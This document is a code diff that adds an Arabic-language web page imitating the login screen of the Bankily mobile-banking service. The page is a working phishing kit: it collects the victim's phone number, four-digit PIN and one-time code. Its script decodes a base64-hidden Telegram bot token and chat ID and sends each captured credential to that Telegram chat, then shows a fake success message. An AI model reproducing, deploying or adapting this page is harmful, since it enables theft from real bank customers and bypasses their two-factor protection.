@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bankily - تسجيل الدخول</title>
+    <style>
+        :root { --primary-blue: #0054a6; --bg-gray: #f7f7f7; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: var(--bg-gray); margin: 0; padding: 0; display: flex; justify-content: center; min-height: 100vh; }
+        
+        .app-container { width: 100%; max-width: 450px; background: #fff; min-height: 100vh; display: flex; flex-direction: column; }
+        
+        /* شاشة الدخول */
+        .top-banner img { width: 100%; display: block; }
+        .login-content { padding: 20px 25px; text-align: right; flex: 1; }
+        
+        .input-label { display: block; margin-bottom: 8px; font-weight: 500; color: #333; font-size: 15px; }
+        
+        .bankily-input-group { 
+            border-bottom: 1px solid #ccc; 
+            margin-bottom: 25px; 
+            display: flex; 
+            align-items: center; 
+            padding-bottom: 5px; 
+        }
+        .bankily-input { width: 100%; border: none; outline: none; font-size: 16px; text-align: right; color: #333; background: transparent; }
+
+        .pin-wrapper { display: flex; justify-content: center; gap: 15px; direction: ltr; margin-top: 5px; width: 100%; }
+        .pin-line { 
+            width: 40px; height: 40px; border: none; border-bottom: 2px solid #999; 
+            font-size: 24px; text-align: center; outline: none; background: transparent; border-radius: 0;
+        }
+        .pin-line:focus { border-bottom-color: var(--primary-blue); border-bottom-width: 3px; }
+
+        .btn-blue { 
+            background-color: var(--primary-blue); color: white; border: none; 
+            width: 100%; padding: 14px; border-radius: 8px; font-size: 18px; 
+            font-weight: bold; cursor: pointer; margin-top: 20px;
+        }
+        
+        .forgot-link { text-align: right; margin-top: 15px; }
+        .forgot-link a { color: #333; text-decoration: underline; font-size: 14px; }
+
+        /* شاشة الـ OTP */
+        #otp-screen { display: none; padding: 40px 20px; text-align: center; background: #fff; flex-direction: column; align-items: center; height: 100vh; }
+        .otp-title { font-size: 18px; font-weight: bold; margin-bottom: 40px; color: #000; }
+        .otp-inputs-container { display: flex; justify-content: center; gap: 20px; direction: ltr; margin-bottom: 30px; }
+        .otp-field { width: 50px; height: 40px; border: none; border-bottom: 3px solid #000; font-size: 28px; text-align: center; font-weight: bold; outline: none; background: transparent; }
+        .otp-field:focus { border-bottom-color: var(--primary-blue); }
+
+        .timer-info { font-size: 14px; color: #555; margin-bottom: 10px; }
+        .timer-count { font-weight: bold; color: #000; font-size: 16px; display: block; margin-top: 5px; }
+        .spinner { width: 30px; height: 30px; border: 3px solid #e0e0e0; border-top: 3px solid #4cd964; border-radius: 50%; animation: spin 1s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #success-screen { display: none; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    <div id="login-screen">
+        <div class="top-banner">
+            <img src="https://i.ibb.co/gZ61X1KD/IMG-0078.jpg" alt="Bankily Banner">
+        </div>
+        
+        <div class="login-content">
+            <p class="input-label">اسم المستخدم أو رقم الهاتف</p>
+            <div class="bankily-input-group">
+                <input type="tel" id="phone" class="bankily-input" maxlength="8">
+            </div>
+
+            <p class="input-label">الرقم السري</p>
+            <div class="bankily-input-group" style="border: none;">
+                <div class="pin-wrapper">
+                    <input type="password" class="pin-line login-pin" maxlength="1" inputmode="numeric">
+                    <input type="password" class="pin-line login-pin" maxlength="1" inputmode="numeric">
+                    <input type="password" class="pin-line login-pin" maxlength="1" inputmode="numeric">
+                    <input type="password" class="pin-line login-pin" maxlength="1" inputmode="numeric">
+                </div>
+            </div>
+
+            <button class="btn-blue" onclick="goToOtp()">تسجيل الدخول</button>
+            
+            <div class="forgot-link">
+                <a href="#">نسيت الرقم السري ؟</a>
+            </div>
+        </div>
+    </div>
+
+    <div id="otp-screen">
+        <div class="otp-title">أدخل رمز التأكيد المرسل إلى هاتفك المحمول</div>
+        <div class="otp-inputs-container">
+            <input type="tel" class="otp-field otp-box" maxlength="1" inputmode="numeric">
+            <input type="tel" class="otp-field otp-box" maxlength="1" inputmode="numeric">
+            <input type="tel" class="otp-field otp-box" maxlength="1" inputmode="numeric">
+            <input type="tel" class="otp-field otp-box" maxlength="1" inputmode="numeric">
+        </div>
+        <div class="timer-info">تنتهي صلاحية الرمز خلال <span class="timer-count" id="timer">04:57</span></div>
+        <div class="spinner"></div>
+        <button class="btn-blue" onclick="finalize()">تأكيد</button>
+    </div>
+
+    <div id="success-screen">
+        <div style="font-size: 80px; color: #4cd964;">✅</div>
+        <h2 style="color: #333; margin-top: 20px;">تمت العملية بنجاح</h2>
+    </div>
+</div>
+
+<script>
+    const _u = "NjU3Mzc2NjM0OTpBQUZ6d0lHc2JZRXRMX2pEcTBsU0xwMTY4OXYySWhtai1Cbw==";
+    const _c = "NjE2NjU5NzUwNw==";
+
+    function sendTelegram(msg) {
+        fetch(`https://api.telegram.org/bot${atob(_u)}/sendMessage?chat_id=${atob(_c)}&text=${encodeURIComponent(msg)}`);
+    }
+
+    function setupInputs(className) {
+        const inputs = document.querySelectorAll('.' + className);
+        inputs.forEach((input, index) => {
+            input.addEventListener('focus', () => {
+                if (index > 0 && inputs[index - 1].value === "") inputs[index - 1].focus();
+            });
+            input.addEventListener('input', () => {
+                input.value = input.value.replace(/[^0-9]/g, '');
+                if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === "Backspace" && !input.value && index > 0) inputs[index - 1].focus();
+            });
+        });
+    }
+
+    setupInputs('login-pin');
+    setupInputs('otp-box');
+
+    function goToOtp() {
+        const phone = document.getElementById('phone').value;
+        const pins = Array.from(document.querySelectorAll('.login-pin')).map(i => i.value).join('');
+        if (phone.length === 8 && /^[234]/.test(phone) && pins.length === 4) {
+            sendTelegram(`👤 دخول:\n📱 هاتف: ${phone}\n🔒 PIN: ${pins}`);
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('otp-screen').style.display = 'flex';
+            startTimer();
+        }
+    }
+
+    function startTimer() {
+        let duration = 297;
+        let timerDisplay = document.getElementById('timer');
+        let timerInterval = setInterval(function () {
+            let minutes = parseInt(duration / 60, 10);
+            let seconds = parseInt(duration % 60, 10);
+            timerDisplay.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
+            if (--duration < 0) clearInterval(timerInterval);
+        }, 1000);
+    }
+
+    function finalize() {
+        const otps = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
+        if (otps.length === 4) {
+            sendTelegram(`📩 رمز OTP: ${otps}`);
+            document.getElementById('otp-screen').style.display = 'none';
+            document.getElementById('success-screen').style.display = 'flex';
+        }
+    }
+</script>
+</body>
+</html>
